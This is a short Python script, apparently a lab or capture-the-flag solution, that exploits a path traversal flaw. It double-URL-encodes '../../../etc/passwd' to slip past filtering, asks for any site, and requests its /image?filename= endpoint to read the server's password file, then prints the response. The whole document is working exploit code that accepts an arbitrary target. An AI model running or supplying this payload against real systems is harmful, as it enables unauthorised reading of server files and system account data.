from urllib.parse import unquote

filename = '''..%252f..%252f..%252fetc%252fpasswd'''
print(unquote(filename))
print(unquote(unquote(filename)))

import requests

s = requests.Session()

site = input("Provide site link: ")  # Fixed the input line
url = f"https://{site}/image?filename={filename}"  # Constructs the URL
resp = s.get(url)
print(resp.text)